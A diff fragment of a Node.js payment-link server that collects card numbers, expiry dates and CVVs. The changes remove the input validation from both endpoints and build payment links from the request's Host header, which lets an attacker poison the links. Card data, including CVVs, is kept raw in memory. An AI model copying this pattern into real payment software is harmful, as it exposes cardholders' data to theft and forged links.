@@ -27,9 +27,6 @@ const io = new SocketIOServer(server, {
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Use PUBLIC_DOMAIN from environment or fallback to your domain
-const PUBLIC_DOMAIN = process.env.landing.html || 'www.khatapay.me';
-
 // Socket.io connection listener
 io.on('connection', (socket) => {
   console.log('A client connected:', socket.id);
@@ -42,12 +39,9 @@ io.on('connection', (socket) => {
 // Endpoint to generate a payment link (which leads to landing.html)
 app.post('/api/generatePaymentLink', (req, res) => {
   const { amount, description } = req.body;
-  if (!amount || !description) {
-    return res.status(400).json({ status: "error", message: "Missing amount or description" });
-  }
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
-  // Use PUBLIC_DOMAIN to generate the correct public URL
-  const paymentLink = `${req.protocol}://${PUBLIC_DOMAIN}/landing.html?pid=${invoiceId}`;
+  // Construct a link that passes the invoiceId as pid in landing.html
+  const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
   paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
   console.log("Payment link generated:", paymentLink);
   res.json({ status: "success", paymentLink });
@@ -82,9 +76,6 @@ app.get('/api/transactions', (req, res) => {
 // Process payment details submission from main payment page
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
-  if (!cardNumber || !expiry || !cvv || !email || !amount || !currency || !cardholder) {
-    return res.status(400).json({ status: "error", message: "Missing payment details" });
-  }
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   const transaction = {
     id: invoiceId,
